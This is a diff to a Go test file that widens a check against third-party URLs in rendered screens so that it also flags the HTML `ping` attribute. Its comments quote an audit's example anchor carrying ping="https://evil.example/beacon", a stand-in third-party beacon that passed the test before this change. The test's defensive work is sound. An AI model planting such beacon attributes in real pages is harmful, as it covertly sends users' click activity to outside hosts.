@@ -1820,9 +1820,15 @@ func assertTagSet(t *testing.T, family string, got map[string]bool, allowed []st
 // URL on an allowed element — measured, in the shared layout shell, on EVERY
 // screen in the product, with the suite green and nothing in tapCSP stopping a
 // top-level meta-refresh navigation. Meta refresh is read below now. What is NOT
-// claimed any more is that the attribute list is finished: it covers href, src
-// and meta-refresh, and any OTHER http-equiv directive is refused outright rather
-// than reasoned about, because this test does not know their semantics.
+// claimed any more is that the attribute list is finished: it covers href, src,
+// `ping` and meta-refresh, and any OTHER http-equiv directive is refused outright
+// rather than reasoned about, because this test does not know their semantics.
+//
+// AND THAT DISCLAIMER EARNED ITS KEEP A SECOND TIME. `ping` is on the list because
+// an audit put <a href="/activate/done" ping="https://evil.example/beacon"> on a
+// tour slide and the whole handler package stayed green — a POST to a third party
+// on click, from an attribute nothing fetches and nothing here was reading. It is
+// one more name, not the end of the class.
 //
 // IT IS ALSO THE FIRST TEST OF A BRAND RULE. skill tappa-brand: "no RUNTIME
 // connection to Google Fonts or any other third party (GDPR + working offline) —
@@ -1867,14 +1873,28 @@ func TestScreens_ReferenceOnlyOurOwnAssets(t *testing.T) {
 	})
 }
 
-// refRE finds the two ordinary URL attributes. metaTagRE and httpEquivRE together
-// find the third channel, which lives on an ALLOWED element rather than on an
-// element of its own — see the note in assertRefs for how it was found. (They
-// replaced a single metaHTTPEquivRE that matched both attributes in one pattern,
-// and therefore in one ORDER; that name is gone and this sentence used to still
-// use it.)
+// refRE finds the ordinary URL attributes. metaTagRE and httpEquivRE together
+// find the channel that lives on an ALLOWED element rather than on an element of
+// its own — see the note in assertRefs for how it was found. (They replaced a
+// single metaHTTPEquivRE that matched both attributes in one pattern, and
+// therefore in one ORDER; that name is gone and this sentence used to still use
+// it.)
+//
+// 🔴 `ping` WAS ADDED AFTER AN AUDIT WALKED A THIRD-PARTY BEACON PAST THIS TEST.
+// It is not an ordinary URL attribute — nothing FETCHES it — which is exactly why
+// it was missed: on click the browser POSTs to every URL in it, so
+//
+//	<a href="/activate/done" ping="https://evil.example/beacon">
+//
+// is a runtime connection to a third party on a page whose brand rule is "absolute
+// URL count 0", and it reached a rendered slide with the whole handler package
+// green (measured). It costs nothing here: `ping` appears in NO template in this
+// repo, so no existing expectation moves.
+//
+// THE LIST IS STILL A LIST, and assertRefs says so in its own words. This entry is
+// one more name on it, not the end of the class.
 var (
-	refRE = regexp.MustCompile(`(?i)\b(href|src)="([^"]*)"`)
+	refRE = regexp.MustCompile(`(?i)\b(href|src|ping)="([^"]*)"`)
 	// metaTagRE + httpEquivRE are deliberately two dumb questions asked in order —
 	// "is this a meta tag" then "does it carry http-equiv, however written" —
 	// rather than one clever pattern that assumes an attribute order HTML does not
